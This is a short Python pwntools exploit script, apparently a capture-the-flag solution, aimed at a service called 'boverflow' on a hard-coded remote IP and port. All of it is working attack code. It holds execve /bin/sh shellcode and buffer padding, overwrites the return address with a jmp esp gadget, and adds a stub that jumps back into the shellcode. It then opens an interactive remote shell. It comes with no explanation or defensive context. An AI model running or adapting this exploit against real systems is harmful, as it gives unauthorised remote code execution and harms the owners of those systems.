
from pwn import *
#io = process("./boverflow")
io=remote('120.27.3.220',10011)
 
shell = '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
 
jmp_esp_addr = 0x8048504
payload = shell + (0x20 - len(shell)) * "A" + "BBBB" + p32(jmp_esp_addr) + asm('sub esp, 0x28;jmp esp')
io.sendline(payload)
io.interactive()
